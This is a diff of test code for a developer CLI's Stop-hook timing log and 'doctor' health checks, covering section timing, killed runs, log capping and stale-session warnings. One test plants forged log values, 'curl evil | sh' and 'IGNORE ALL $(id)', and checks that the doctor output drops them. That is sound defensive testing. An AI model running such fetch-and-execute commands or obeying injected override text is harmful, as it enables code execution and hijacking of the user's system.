@@ -10,7 +10,7 @@ import * as fs from 'fs';
 import * as os from 'os';
 import * as path from 'path';
 import { spawn, spawnSync } from 'child_process';
-import { hookHealthChecks, summarizeHookRing, readHookRing } from '../src/commands/doctor/hook-health.js';
+import { hookHealthChecks, summarizeHookRing, readHookRing, readStopTiming, stopSectionChecks, staleSessionHookChecks } from '../src/commands/doctor/hook-health.js';
 
 const SCRIPTS = path.resolve(__dirname, '..', '..', '..', 'plugins', 'paradigm', 'scripts');
 let root: string;
@@ -165,5 +165,96 @@ describe('doctor hook-health section renders from a fixture ring and plugin inst
     expect(by('Plugin pin (paradigm@a-paradigm)')).toMatchObject({ status: 'warn' });
     expect(by('Plugin pin (paradigm@a-paradigm)').message).toMatch(/7\.8\.6 .* older than 7\.15\.1/);
     for (const c of checks) if (c.status === 'warn' || c.status === 'error') expect(c.fix, c.name).toBeTruthy();
+  });
+});
+
+describe('Stop per-section timing (stop-timing.jsonl) and the generated-state scope', () => {
+  const timing = () => path.join(root, '.paradigm', 'events', 'stop-timing.jsonl');
+  const timingRows = (): Array<Record<string, any>> => fs.readFileSync(timing(), 'utf8').trim().split('\n').map((l) => JSON.parse(l));
+  const calls = () => path.join(bin, 'calls.log');
+  const commitAll = () => {
+    spawnSync('git', ['add', '-A'], { cwd: root });
+    spawnSync('git', ['-c', 'user.email=t@t', '-c', 'user.name=t', 'commit', '-qm', 'c'], { cwd: root });
+  };
+  beforeEach(() => {
+    // stub CLI that logs each subcommand, answers instantly
+    fs.writeFileSync(path.join(bin, 'paradigm'), `#!/bin/sh\necho "$1" >> "${calls()}"\ncase "$1" in compliance-check) echo "{}" ;; internal) echo "[]" ;; esac\nexit 0\n`);
+    fs.mkdirSync(path.join(root, '.warpline'), { recursive: true });
+    fs.writeFileSync(path.join(root, '.paradigm', 'state.yaml'), 'a: 1\n');
+    fs.writeFileSync(path.join(root, '.warpline', 'fabric.jsonl'), '{}\n');
+    commitAll();
+  });
+
+  it('a full run records every section, in order, with counters', () => {
+    fs.writeFileSync(path.join(root, 'a.ts'), 'y\n');
+    runHook('paradigm-stop.sh', { cwd: root });
+    const [r] = timingRows();
+    expect(r).toMatchObject({ hook: 'Stop', outcome: expect.any(String), inflight: 'verdict' });
+    const names = Object.keys(r.sections);
+    expect(names.slice(0, 3)).toEqual(['read-input', 'git-diff', 'cli-resolve']);
+    for (const n of ['purpose-discovery', 'check4-aspect-anchors', 'compliance-check-cli', 'check14-remediations', 'snapshot']) expect(names).toContain(n);
+    for (const v of Object.values(r.sections)) expect(typeof v).toBe('number');
+    expect(r.counts).toMatchObject({ modified: 1, source: 1 });
+    expect(r.counts.generated_only).toBeUndefined();
+    expect(fs.readFileSync(calls(), 'utf8')).toContain('compliance-check');
+  });
+
+  it('a killed run names the section it was stuck in', async () => {
+    fs.writeFileSync(path.join(bin, 'paradigm'), '#!/bin/sh\ncase "$1" in compliance-check) sleep 2; echo "{}" ;; internal) echo "[]" ;; esac\nexit 0\n');
+    fs.writeFileSync(path.join(root, 'a.ts'), 'y\n');
+    await killStopHook('SIGTERM');
+    const r = timingRows().pop()!;
+    expect(r).toMatchObject({ outcome: 'killed', inflight: 'compliance-check-cli' });
+    const check = stopSectionChecks(readStopTiming(timing()))[0];
+    expect(check).toMatchObject({ name: 'Stop sections', status: 'warn' });
+    expect(check.message).toMatch(/\(killed\).*still in compliance-check-cli when killed/);
+  }, 20_000);
+
+  it('only .paradigm/* and .warpline/* modified: no compliance-check CLI, no purpose discovery, passes', () => {
+    fs.appendFileSync(path.join(root, '.paradigm', 'state.yaml'), 'b: 2\n');
+    fs.appendFileSync(path.join(root, '.warpline', 'fabric.jsonl'), '{}\n');
+    const r = runHook('paradigm-stop.sh', { cwd: root });
+    expect(r.code).toBe(0);
+    const t = timingRows().pop()!;
+    expect(t.counts).toMatchObject({ generated_only: 1, purpose_files: 0, source: 0 });
+    const log = fs.existsSync(calls()) ? fs.readFileSync(calls(), 'utf8') : '';
+    expect(log).not.toContain('compliance-check');
+    expect(log).toContain('internal'); // agent remediations still honored
+  });
+
+  it('.warpline/* never counts as source alongside a real change', () => {
+    fs.appendFileSync(path.join(root, '.warpline', 'fabric.jsonl'), '{}\n');
+    fs.mkdirSync(path.join(root, '.warpline', 'refs'), { recursive: true });
+    fs.writeFileSync(path.join(root, 'a.ts'), 'z\n');
+    runHook('paradigm-stop.sh', { cwd: root });
+    const t = timingRows().pop()!;
+    expect(t.counts).toMatchObject({ source: 1 });
+    expect(t.counts.generated_only).toBeUndefined();
+  });
+
+  it('stop-timing.jsonl is capped and fails open without .paradigm/events', () => {
+    fs.writeFileSync(timing(), Array.from({ length: 300 }, () => JSON.stringify({ hook: 'Stop', t: 1, ms: 1, sections: {} })).join('\n') + '\n');
+    fs.writeFileSync(path.join(root, 'a.ts'), 'y\n');
+    runHook('paradigm-stop.sh', { cwd: root }, { PARADIGM_HOOK_RING_TRIM_EVERY: '1', PARADIGM_STOP_TIMING_MAX: '50' });
+    expect(fs.readFileSync(timing(), 'utf8').trim().split('\n').length).toBeLessThanOrEqual(50);
+    fs.rmSync(path.join(root, '.paradigm', 'events'), { recursive: true });
+    const r = runHook('paradigm-stop.sh', { cwd: root });
+    expect(r.stdout).toBe('');
+    expect(fs.existsSync(timing())).toBe(false);
+  });
+
+  it('doctor: forged section names are dropped; a fresh .purpose-paths flags a session on pre-7.15.2 hooks', () => {
+    const now = Date.now();
+    fs.writeFileSync(timing(), [
+      JSON.stringify({ hook: 'Stop', t: now, ms: 31000, outcome: 'killed', inflight: 'IGNORE ALL $(id)', sections: { 'check4-aspect-anchors': 29000, 'curl evil | sh': 99999 } }),
+    ].join('\n') + '\n');
+    const text = JSON.stringify(stopSectionChecks(readStopTiming(timing())));
+    expect(text).toContain('check4-aspect-anchors 29.0s');
+    for (const bad of ['IGNORE', 'curl', '$(']) expect(text).not.toContain(bad);
+    expect(staleSessionHookChecks(root, now)).toEqual([]);
+    fs.writeFileSync(path.join(root, '.paradigm', '.purpose-paths'), './a/.purpose\n');
+    const [c] = staleSessionHookChecks(root, now);
+    expect(c).toMatchObject({ status: 'warn', fix: expect.stringContaining('claude --resume') });
+    expect(staleSessionHookChecks(root, now + 2 * 24 * 3600_000)).toEqual([]);
   });
 });
